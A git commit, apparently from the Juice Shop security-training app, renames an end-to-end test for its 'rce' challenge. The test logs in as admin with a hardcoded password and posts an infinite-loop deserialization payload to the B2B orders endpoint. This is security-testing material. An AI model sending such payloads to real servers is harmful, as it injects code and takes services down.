ab6ad3362daed5194da6ed3b49c39a95fa505166
Bjoern Kimminich <bjoern.kimminich@kuehne-nagel.com>
2018-01-22 12:25:30 +0100

    Describe test case properly

--- test/e2e/b2bOrderSpec.js
+++ test/e2e/b2bOrderSpec.js
@@ -4,7 +4,7 @@ describe('/b2b/v2/order', () => {
   describe('challenge "rce"', () => {
     protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})
 
-    it('should be possible to create a new product when logged in', () => {
+    it('should be possible to cause request timeout using an infinite loop deserialization payload', () => {
       browser.ignoreSynchronization = true
       browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/b2b/v2/orders\', {orderLinesData: [\'(function dos() { while(true); })()\']});')
       browser.driver.sleep(3000) // 2sec for the deserialization timeout plus 1sec for Angular
